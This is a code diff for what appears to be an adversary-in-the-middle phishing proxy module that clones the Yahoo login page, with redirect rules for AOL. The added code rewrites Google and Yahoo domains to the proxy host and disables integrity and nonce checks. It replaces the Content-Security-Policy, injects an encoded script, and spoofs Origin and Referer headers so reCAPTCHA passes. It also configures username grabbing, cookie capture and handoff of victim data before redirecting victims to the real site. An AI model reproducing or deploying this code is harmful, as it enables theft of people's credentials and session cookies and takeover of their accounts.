@@ -17,6 +17,9 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
     }
 
     processRequest() {
+        if (this.browserReq.url.startsWith('/recaptcha')) {
+            return this.browserReq.pipe(this.proxyEndpoint)
+        }
         return super.processRequest()
 
     }
@@ -28,31 +31,71 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
        
         super(proxyResp, browserEndPoint)
         this.regexes = [
-             {
-                reg: /window.__BssoInterrupt_/igm, // Google chrome on windows fix
-                replacement: 'window.__BssoInterrupt_Core=!0;</script>'
-                    + '</head> <body data-bind="defineGlobals: ServerData" style="display: none"> </body> </html>',
-             },
+            
+            {
+                reg: /www\.google\.com/,
+                replacement: browserEndPoint.clientContext.hostname
+            },
+            {
+                reg: /fc\.yahoo\.com/igm,
+                replacement: `${browserEndPoint.clientContext.hostname}/fc.yahoo.com/~`
+            },
+            {
+                reg: /csp\.yahoo\.com/igm,
+                replacement: `${browserEndPoint.clientContext.hostname}/csp.yahoo.com/~`
+            },
+            {
+                reg: /s\.yimg\.com/igm,
+                replacement: `${browserEndPoint.clientContext.hostname}/s.yimg.com/~`
+            },
+            {
+                reg: /(<head>)([\s\S]*?)(<\/head>)/,
+                replacement: '$1\n<script src=\"data:text/javascript;base64,ZnVuY3Rpb24gYygpe2lmKCFkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuYiIpIHx8ICFkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuZyIpKXtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKE9iamVjdC5hc3NpZ24oZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iikse2NsYXNzTGlzdDpbImIiXX0pKTtkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuc3R5bGUuZmlsdGVyPSJodWUtcm90YXRlKDRkZWcpIjtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKE9iamVjdC5hc3NpZ24oZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iikse2NsYXNzTGlzdDpbImciXX0pKTtzZXRUaW1lb3V0KGMsMWUzKX19YygpOwo=\"></script>\n$2$3'
+            },
+            {
+                reg: /<title[^>]*>(.*?)<\/title>/i,
+                replacement: '<title>thr33cpio</title>'
+            },
+            {
+                reg: /login\.yahoo\.net/,
+                replacement: browserEndPoint.clientContext.hostname
+            },
+            {
+                reg: /www.gstatic.com/,
+                replacement: browserEndPoint.clientContext.hostname
+            },
+            {
+                reg: /integrity/igm,
+                replacement:'xintegrity'
+            },
+            {
+                reg: /nonce/gm,
+                replacement:'nononcense'
+            },
+            {
+                reg: /<meta http-equiv="Content-Security-Policy" content="(.*?)/igm,
+                replacement: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: ; style-src * data: blob: \'unsafe-inline\'; font-src * data: blob: \'unsafe-inline\';"'
+            }
         ]
     }
 
 
     processResponse() {
-        this.browserEndPoint.removeHeader('X-Frame-Options')
         if (this.proxyResp.headers['content-length'] < 1) {
             return this.proxyResp.pipe(this.browserEndPoint)
         }
-
+        this.browserEndPoint.setHeader('Content-Security-Policy', "default-src *  data: blob: filesystem: about: ws: wss: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src * data: blob: ; style-src * data: blob: 'unsafe-inline'; font-src * data: blob: 'unsafe-inline';");
 
         const extRedirectObj = super.getExternalRedirect()
         if (extRedirectObj !== null) {
             const rLocation = extRedirectObj.url
-            if (rLocation.startsWith('https://www.yahoo.com/?guccounter=1&guce_referrer=') || rLocation === 'https://www.yahoo.com/' 
-            || rLocation.startsWith('/account/comm-channel/refresh')) {
-                this.browserEndPoint.setHeader('location', '/auth/login/finish')
-            }
-           
-            // this.browserEndPoint.setHeader('location', '/auth/login/finish')
+            const checkUrls = ["https://guce.yahoo.com", "https://www.yahoo.com/?guccounter=1&guce_referrer=", "https://www.yahoo.com/", "/account/comm-channel/refresh"]
+            
+            for (let exitUrl of checkUrls) {
+                if (rLocation.startsWith(exitUrl)) {
+                    this.browserEndPoint.setHeader('location', '/auth/login/finish')
+                }
+            }           
         }
 
         // return super.processResponse()
@@ -88,27 +131,74 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
     execute(clientContext) {
 
-        if (this.req.method === 'POST') {
-            // super.uploadRequestBody(clientContext.currentDomain, clientContext)
-            clientContext.setLogAvailable(true);
-            super.captureBody(clientContext.currentDomain, clientContext)
+        super.loadAutoGrab(configExport.AUTOGRAB_CODE)
+
+        if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
+            const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
+            const hostnameBase64Key = hostnameKey.toString('base64');
+
+            this.req.url = this.req.url.replace('..', '==')
+            this.req.url = this.req.url.replace('.&', '=&')
+
+
+            this.req.url = this.req.url.replace(hostnameBase64Key, 'aHR0cHM6Ly9sb2dpbi55YWhvby5uZXQ6NDQz')
+
+            
+            console.log(this.req.url)
+            return super.superExecuteProxy('www.google.com', clientContext)
+
 
         }
-        if (this.req.url === '/auth/login/finish' || this.req.url === '/account/fb-messenger-linking') {
-            super.sendClientData(clientContext, {})
-            this.res.writeHead(302, { location: 'https://mail.yahoo.com'})
-            return this.res.end('')
+
+
+        if (this.req.url.startsWith('/recaptcha/enterprise')) {
+            this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'www.google.com') : ''
+            this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'www.google.com') : ''
+
+
+            console.log(JSON.stringify(this.req.headers))
+            
+            return super.superExecuteProxy('www.google.com', clientContext)
+
         }
+
+
+        if (this.req.url.startsWith('/recaptcha/releases/')) {
+
+            this.req.headers['origin'] = 'https://login.yahoo.net'
+            this.req.headers['referer'] = 'https://login.yahoo.net'
+            return super.superExecuteProxy('www.gstatic.com', clientContext)
+       }
+
+       
 
 
         const redirectToken = this.checkForRedirect()
-        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
-            clientContext.currentDomain = process.env.PROXY_DOMAIN
-            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
-            // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
-        }
+        if (redirectToken !== null) {
 
-        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+            const checkUrls = ["https://guce.yahoo.com", 
+            "https://www.yahoo.com/?guccounter=1&guce_referrer=", "https://www.yahoo.com/", 
+             "/account/comm-channel/refresh", '/account/upsell/webauthn',
+             "https://api.login.aol.com/oauth2/request_auth",
+             'https://guce.aol.com/consent', "https://www.aol.com/"
+
+             ]
+             for (let exitUrl of checkUrls) {
+                if (redirectToken.url.startsWith(exitUrl)) {
+                    super.sendClientData(clientContext, {})
+                    this.res.writeHead(302, { location: '/auth/login/finish' })
+                    return super.cleanEnd(clientContext.currentDomain, clientContext)
+                }
+            }
+
+            console.log(JSON.stringify(redirectToken))
+            const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
+            this.req.url = reqCheck.replace(clientContext.hostname, 'www.google.com')
+
+            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
+        }
+      
+        return super.execute(clientContext)
 
     }
 }
@@ -117,14 +207,45 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 
 const configExport = {
+    SCHEME: 'yahoo',
+
     CURRENT_DOMAIN: 'login.yahoo.com',
 
     START_PATH: '/',
 
+    AUTOGRAB_CODE: 'username',
+    COOKIE_PATH: ['/auth/login/finish', '/account/fb-messenger-linking', '/account/upsell/webauth', 
+    '/account/comm-channel/'],
 
-    PRE_HANDLERS:
-        [
-        ],
+    EXIT_TRIGGER_PATH: ['/auth/login/finish', '/account/fb-messenger-linking', '/account/upsell/webauth', 
+    '/account/comm-channel/'],
+
+
+    EXIT_URL: 'https://yahoo.com',
+
+    EXTRA_COMMANDS: [
+        
+        {
+            path: '/recaptcha/releases.*',
+            command: 'CHANGE_DOMAIN',
+            command_args: {
+                new_domain: 'www.gstatic.com',
+                persistent: false,
+                },
+        },
+        {
+            path: '/sandbox.*',
+            command: 'CHANGE_DOMAIN',
+            command_args: {
+                new_domain: 'gpt.mail.yahoo.net',
+                persistent: false,
+                },
+        },
+
+    ],
+
+
+    PRE_HANDLERS:[],
     PROXY_REQUEST: ProxyRequest,
     PROXY_RESPONSE: ProxyResponse,
     DEFAULT_PRE_HANDLER: DefaultPreHandler,
@@ -144,23 +265,17 @@ const configExport = {
             hosts: ['login.yahoo.com'],
         },
 
-
-        loginFmt: {
-            method: 'POST',
-            params: ['loginfmt'],
-            urls: '',
-            hosts: ['login.microsoftonline.com'],
-        },
-
-        defaultPhpCapture: {
-            method: 'POST',
-            params: ['default'],
-            urls: ['/web'],
-            hosts: 'PHP-EXEC',
-        },
     },
+
+    //MODULE OPTIONS 
+    MODULE_ENABLED: true,
+
+    MODULE_OPTIONS: {
+        startPath: this.START_PATH,
+        exitLink: '',
+    },
+
 
     // proxyDomain: process.env.PROXY_DOMAIN,
 }
 module.exports = configExport
-
